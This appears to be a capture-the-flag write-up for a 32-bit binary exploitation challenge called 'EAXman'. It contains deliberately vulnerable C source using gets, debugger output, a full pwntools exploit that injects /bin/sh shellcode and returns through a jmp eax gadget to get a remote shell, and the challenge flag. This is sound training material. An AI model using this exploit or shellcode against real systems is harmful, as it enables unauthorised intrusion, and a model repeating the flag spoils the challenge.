# EAXman

Difficulty Level: Hard
 
Return to stack but this time without the location of buffer. A useful gadget is added too. Find out how to use it and gain a shell!
 
Connect via `nc challenge.ctf-fun.xyz 14015`

PS: Challenges in this category require a linux environment read [here](https://docs.google.com/document/d/13RjL_RWibA9xYOKvSCXpTGG0D2ZYa3kDzprGNa8ypeA/edit?usp=sharing) for a guide to installing a linux VM

### Hints

- no hints provided


## Deployment

```bash
cd service
sudo ./eaxman.sh &
```

## Solution
Looking at the source code, we see that we can overflow buffer and there's a `jmp eax` gadget given

```c
#include <stdio.h>

void usefulGadget(){
	__asm__("jmp %eax\n\t");
}

void vulnerable(){
	char buffer[32] = {0x00};

	printf("%s\n", "The superhero we never needed, EAXman!");
	printf("%s\n", "No special powers, only the ability to jump!");
	printf("%s\n", "What do you think?");	

	gets(buffer);
}

int main(){
	setvbuf(stdout, NULL, _IONBF, 0);

	vulnerable();
}
```

disassemble the binary and we see that `jmp eax` is located at 0x0804918f

```bash
gef➤  disassemble usefulGadget 
Dump of assembler code for function usefulGadget:
   0x08049182 <+0>:     push   ebp
   0x08049183 <+1>:     mov    ebp,esp
   0x08049185 <+3>:     call   0x804926f <__x86.get_pc_thunk.ax>
   0x0804918a <+8>:     add    eax,0x2e76
   0x0804918f <+13>:    jmp    eax
   0x08049191 <+15>:    nop
   0x08049192 <+16>:    pop    ebp
   0x08049193 <+17>:    ret    
End of assembler dump.
gef➤ 
```

debug and send a payload to the program and we see that eax points to the start of the payload. 

```bash
gef➤  r                                                                                                                                                                                                  [9/1744]
Starting program: /home/kali/ctf/AOG-CTF/Binary_Exploitation/eaxman/distrib/eaxman                                                                                                                               
The superhero we never needed, EAXman!                                                                                                                                                                           
No special powers, only the ability to jump!                                                                                                                                                                     
What do you think?                                                                                                                                                                                               
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa                                                                                                             
                                                                                                                                                                                                                 
Program received signal SIGSEGV, Segmentation fault.                                                                                                                                                             
0x6161616c in ?? ()                                                                                                                                                                                              
[ Legend: Modified register | Code | Heap | Stack | String ]                                                                                                                                                     
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────                                                     
$eax   : 0xffffd1a0  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"                                                                                                                                
$ebx   : 0x6161616a ("jaaa"?)                       
$ecx   : 0xf7fa9580  →  0xfbad2288                  
$edx   : 0xfbad2288                                 
$esp   : 0xffffd1d0  →  "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"                                                                                                                                
$ebp   : 0x6161616b ("kaaa"?)                       
$esi   : 0xf7fa9000  →  0x001e4d6c                  
$edi   : 0xf7fa9000  →  0x001e4d6c                  
$eip   : 0x6161616c ("laaa"?)                       
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]                                                                                                      
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063                                 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────                                                     
0xffffd1d0│+0x0000: "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"    ← $esp                                                                                                                          
0xffffd1d4│+0x0004: "naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"                                  
0xffffd1d8│+0x0008: "oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"                                      
0xffffd1dc│+0x000c: "paaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"                                          
0xffffd1e0│+0x0010: "qaaaraaasaaataaauaaavaaawaaaxaaayaaa"                                              
0xffffd1e4│+0x0014: "raaasaaataaauaaavaaawaaaxaaayaaa"                                                  
0xffffd1e8│+0x0018: "saaataaauaaavaaawaaaxaaayaaa"                                                      
0xffffd1ec│+0x001c: "taaauaaavaaawaaaxaaayaaa"                                                          
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────                                                     
[!] Cannot disassemble from $PC                     
[!] Cannot access memory at address 0x6161616c                                                          
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────                                                     
[#0] Id 1, Name: "eaxman", stopped 0x6161616c in ?? (), reason: SIGSEGV                                 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────                                                     
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────                                                     
gef➤ 
```

All we need to do is to find a payload that is smaller than 44 (offset value) and return to `eax`

```python
from pwn import *

def main():
	jmp_eax = p32(0x0804918f)

	# http://shell-storm.org/shellcode/files/shellcode-827.php
	shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
	shellcode += b"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

	padding = b'A' * (44 - len(shellcode))

	payload = shellcode + padding + jmp_eax

	#io = process('./eaxman')
	io = remote("challenge.ctf-fun.xyz", 14015)
	io.sendline(payload)
	io.interactive()

if __name__ == '__main__':
	main()
```
### Flag
19C4{T0_0xffffffff_4nd_b3y0nd}
